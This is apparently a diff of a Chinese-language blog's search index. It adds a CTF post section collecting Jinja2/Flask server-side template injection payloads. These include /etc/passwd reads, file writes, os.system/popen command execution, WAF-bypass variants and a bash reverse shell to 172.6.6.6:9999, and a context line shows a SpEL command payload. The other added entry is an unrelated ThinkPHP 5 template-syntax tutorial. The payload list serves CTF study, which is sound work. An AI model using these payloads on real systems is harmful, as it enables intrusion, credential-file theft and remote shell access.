@@ -210,6 +210,45 @@
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line"></span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&#x27;cat etc/passwd&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这里面的 T() 是 EL 的语法规定（比如 Spring 框架的 EL 就是 SPEL)</p>
+<h2 id="二、开始运用"><a href="#二、开始运用" class="headerlink" title="二、开始运用"></a>二、开始运用</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2354192/1599480440997-00e10dda-bb44-4fe7-9b87-2a8de03b598d.png"></p>
+<p>这张图可以说是百试百灵了，然后接下来我们继续根据不同的模版和语言特性进行常用payload的使用总结</p>
+<h3 id="Jinja2使用"><a href="#Jinja2使用" class="headerlink" title="Jinja2使用"></a>Jinja2使用</h3><h3 id="1-flask的全局变量"><a href="#1-flask的全局变量" class="headerlink" title="1.flask的全局变量"></a>1.flask的全局变量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config 保存着隐私信息</span><br><span class="line">config.from_object(&#39;os&#39;) </span><br><span class="line">request.environ是一个字典，其中包含和服务器环境相关的对象 </span><br></pre></td></tr></table></figure>
+
+<h3 id="2-python强大的内省特性"><a href="#2-python强大的内省特性" class="headerlink" title="2.python强大的内省特性"></a>2.python强大的内省特性</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">总结:</span><br><span class="line">通过某种类型(字符串:&quot;&quot;，list:[]，int：1)开始引出，__class__找到当前类，__mro__或者__base__找到__object__，前边的语句构造都是要找这个。然后利用object找到能利用的类。还有就是&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)&#125;&#125;这种的，能执行，但是不会回显。一般来说，python2的话用file就行，python3则没有这个属性。</span><br></pre></td></tr></table></figure>
+
+<p>常见的内省函数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__builtins__</span><br><span class="line">__import__</span><br><span class="line">__class__返回调用的参数类型。</span><br><span class="line">__base__返回基类</span><br><span class="line">__mro__允许我们在当前Python环境下追溯继承树</span><br><span class="line">__subclasses__()返回子类</span><br><span class="line">builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块</span><br></pre></td></tr></table></figure>
+
+<p>常见的寻找过程</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__.__base__.__subclasses__()</span><br><span class="line"># 返回子类的列表 [,,,...]</span><br><span class="line">#从中随便选一个类,查看它的__init__</span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__subclasses__()[30].__init__</span><br><span class="line">&lt;slot wrapper &#39;__init__&#39; of &#39;object&#39; objects&gt;</span><br><span class="line"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span><br><span class="line"></span><br><span class="line">#再换几个子类，很快就能找到一个重载过__init__的类，比如</span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__subclasses__()[5].__init__</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__subclasses__()[5].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</span><br><span class="line">#然后用eval执行命令即可</span><br></pre></td></tr></table></figure>
+
+<p>安全研究员给出的常用的payload</p>
+<p>文件读取</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#读文件</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;  </span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class="line">#写文件</span><br><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;1&#39;).write(&quot;&quot;) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>任意执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;owned.cfg&#39;,&#39;w&#39;).write(&#39;code&#39;)&#125;&#125; </span><br><span class="line">&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;owned.cfg&#39;) &#125;&#125;  </span><br></pre></td></tr></table></figure>
+
+<p>写入一次</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;owned.cfg&#39;,&#39;w&#39;).write(&#39;from subprocess import check_output\n\nRUNCMD &#x3D; check_output\n&#39;)&#125;&#125;  </span><br><span class="line">&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;owned.cfg&#39;) &#125;&#125;  </span><br><span class="line">&#123;&#123; config[&#39;RUNCMD&#39;](&#39;&#x2F;usr&#x2F;bin&#x2F;id&#39;,shell&#x3D;True) &#125;&#125; </span><br></pre></td></tr></table></figure>
+
+<p>不回显</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;eval&#39;](&#39;1+1&#39;)&#125;&#125;      </span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)&#125;&#125;(这条指令可以注入，但是如果直接进入python2打这个poc，会报错，用下面这个就不会，可能是python启动会加载了某些模块)  </span><br><span class="line">http:&#x2F;&#x2F;39.105.116.195&#x2F;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;(system函数换为popen(&#39;&#39;).read()，需要导入os模块)  </span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;(不需要导入os模块，直接从别的模块调用)</span><br></pre></td></tr></table></figure>
+
+<p>python3</p>
+<p>文件读取</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27&#x2F;etc&#x2F;passwd%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>命令执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>脚本使用示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ttp:&#x2F;&#x2F;192.168.228.36&#x2F;?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;ImmutableDictMixin&#39; %&#125;&#123;&#123; c.__hash__.__globals__[&#39;__builtins__&#39;].eval(&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">绕waf</span><br><span class="line">python2：</span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&quot;ls&quot;)&#39;)</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39;+&#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.6.6.6&#x2F;9999 0&gt;&amp;1&quot;&#39;)</span><br><span class="line"></span><br><span class="line">python3：</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;]</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -835,6 +874,64 @@
       <tags>
         <tag>CTF</tag>
         <tag>CVE，未完全解决</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ThinkPhp-5</title>
+    <url>/2020/09/23/ThinkPhp-5/</url>
+    <content><![CDATA[<h1 id="ThinkPhp-5"><a href="#ThinkPhp-5" class="headerlink" title="ThinkPhp-5"></a>ThinkPhp-5</h1><h2 id="模版的条件判断标签"><a href="#模版的条件判断标签" class="headerlink" title="模版的条件判断标签"></a>模版的条件判断标签</h2><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;switch number&#125; </span><br><span class="line">&#123;case 1&#125;1&#123;&#x2F;case&#125;</span><br><span class="line">&#123;case 5&#125;5&#123;&#x2F;case&#125;</span><br><span class="line">&#123;case 10&#125;10&#123;&#x2F;case&#125; </span><br><span class="line">&#123;default&#x2F;&#125;不存在 &#123;&#x2F;switch&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;if ($number &gt; 10) and ($number &lt; 20)&#125;</span><br><span class="line">    6666</span><br><span class="line">&#123;else if $number &#x3D;&#x3D; 10&#125;</span><br><span class="line">    8888</span><br><span class="line">&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<h3 id="present-和-notpresent-判断变量是否已经定义赋值-是否存在-；"><a href="#present-和-notpresent-判断变量是否已经定义赋值-是否存在-；" class="headerlink" title="{present}和{notpresent}判断变量是否已经定义赋值(是否存在)；"></a>{present}和{notpresent}判断变量是否已经定义赋值(是否存在)；</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;present name&#x3D;&#39;user&#39;&#125;</span><br><span class="line">存在</span><br><span class="line">&#123;&#x2F;present&#125;</span><br><span class="line">&#123;present name&#x3D;&#39;user&#39;&#125; </span><br><span class="line">user已存在 </span><br><span class="line">&#123;else&#x2F;&#125; </span><br><span class="line">user不存在 </span><br><span class="line">&#123;&#x2F;present</span><br></pre></td></tr></table></figure>
+
+<h3 id="empty-和-notempty-判断变量是否为空值"><a href="#empty-和-notempty-判断变量是否为空值" class="headerlink" title="{empty}和{notempty}判断变量是否为空值"></a>{empty}和{notempty}判断变量是否为空值</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;empty name&#x3D;&#39;username&#39;&#125;</span><br><span class="line">有值</span><br><span class="line">&#123;&#x2F;empty&#125;</span><br><span class="line">&#123;empty name&#x3D;&#39;username&#39;&#125; </span><br><span class="line">username 有值</span><br><span class="line">&#123;else&#x2F;&#125;</span><br><span class="line">username 没值 </span><br><span class="line">&#123;&#x2F;empty&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;defined name&#x3D;&#39;PI&#39;&#125;</span><br><span class="line">PI存在 </span><br><span class="line">&#123;else&#x2F;&#125;</span><br><span class="line">PI不存在 </span><br><span class="line">&#123;&#x2F;defined&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="模版的加载包含输出"><a href="#模版的加载包含输出" class="headerlink" title="模版的加载包含输出"></a>模版的加载包含输出</h2><h3 id="包含文件"><a href="#包含文件" class="headerlink" title="包含文件"></a>包含文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;include file&#x3D;&#39;public&#x2F;header&#39; title&#x3D;&#39;$title&#39; keywords&#x3D;&#39;模版&#39;&#x2F;&#125;</span><br><span class="line">主体</span><br><span class="line">&#123;include file&#x3D;&#39;..&#x2F;application&#x2F;view&#x2F;public&#x2F;footer.html&#39;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>header.html</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;[title]&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;头部&lt;br&gt;</span><br></pre></td></tr></table></figure>
+
+<p>footer</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;br&gt;尾部&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="输出替换"><a href="#输出替换" class="headerlink" title="输出替换"></a>输出替换</h3><p>运用于调用静态文件，将路径打包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在目前二级目录下，template.php 中，配置新增一个参数；</span><br><span class="line">&#39;tpl_replace_string&#39; &#x3D;&gt; [ &#39;__JS__&#39; &#x3D;&gt; &#39;static&#x2F;js&#39;, &#39;__CSS__&#39; &#x3D;&gt; &#39;static&#x2F;css&#39;, ]</span><br></pre></td></tr></table></figure>
+
+<p>如果是在顶级域名下，直接在改成/static/css 即可，加一个反斜杠； </p>
+<p>html 文件调用端，直接通过<code>__CSS__(__JS__)</code>配置的魔术方法调用即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;__CSS__&#x2F;basic.css&quot;&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;__JS__&#x2F;basic.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="模版的布局和继承"><a href="#模版的布局和继承" class="headerlink" title="模版的布局和继承"></a>模版的布局和继承</h2><h3 id="模版的布局"><a href="#模版的布局" class="headerlink" title="模版的布局"></a>模版的布局</h3><p>开启布局功能</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">template.php</span><br><span class="line">&#39;layout_on&#39; &#x3D;&gt; true,</span><br><span class="line">&#x2F;&#x2F; 改变模版位置</span><br><span class="line">  &#39;layout_name&#39; &#x3D;&gt; &#39;public&#x2F;layout&#39;,</span><br><span class="line">  &#x2F;&#x2F;更改__content__</span><br><span class="line">  &#39;layout_item&#39; &#x3D;&gt; &#39;&#123;__REPLACE__&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>然后模版开启</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;include file&#x3D;&#39;public&#x2F;header&#39; title&#x3D;&#39;$title&#39; keywords&#x3D;&#39;模版&#39;&#x2F;&#125;</span><br><span class="line">&#123;__CONTENT__&#125;&#x2F;&#x2F;引入index.html中的内容</span><br><span class="line">&#123;include file&#x3D;&#39;..&#x2F;application&#x2F;view&#x2F;public&#x2F;footer.html&#39;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二种打开模版"><a href="#第二种打开模版" class="headerlink" title="第二种打开模版"></a>第二种打开模版</h3><p>index.html</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;layout name&#x3D;&quot;public&#x2F;layout&quot; repalce&#x3D;&#39;[__CONTENT__]&#39;&#125;</span><br><span class="line">主体</span><br></pre></td></tr></table></figure>
+
+<h3 id="第三种打开模版"><a href="#第三种打开模版" class="headerlink" title="第三种打开模版"></a>第三种打开模版</h3><p>在C端实现</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$this-&gt;view-&gt;engine-&gt;layout(true);&#x2F;&#x2F;如果不使用默认路径还是需要更改配置</span><br></pre></td></tr></table></figure>
+
+<h2 id="模版继承"><a href="#模版继承" class="headerlink" title="模版继承"></a>模版继承</h2><p>首先创建一个类似于父类的东西</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;$title&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;block name=&#x27;nav&#x27;&#125;nav&#123;/block&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;block name=&#x27;footer&#x27;&#125; @ThinkPHP 版权所有 &#123;/block&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意其中有两个block标签，是用来进行占位的</p>
+<p>然后进行调用 <code>&#123;__block__&#125;</code>这是用来引用原来的基类中的内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;extend name&#x3D;&#39;public&#x2F;base&#39;&#125;</span><br><span class="line">&#123;extend name&#x3D;&#39;..&#x2F;application&#x2F;view&#x2F;public&#x2F;base.html&#39;&#125;</span><br><span class="line">&#123;block name&#x3D;&#39;nav&#39;&#125;</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;首页&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;分类&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;关于&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ol&gt;</span><br><span class="line">&#123;&#x2F;block&#125;</span><br><span class="line">&#123;block name&#x3D;&#39;footer&#39;&#125;</span><br><span class="line">I LOVE YOU &#123;__block__&#125;</span><br><span class="line">&#123;&#x2F;block&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>编程</category>
+      </categories>
+      <tags>
+        <tag>编程</tag>
+        <tag>ThinkPHP</tag>
       </tags>
   </entry>
 </search>
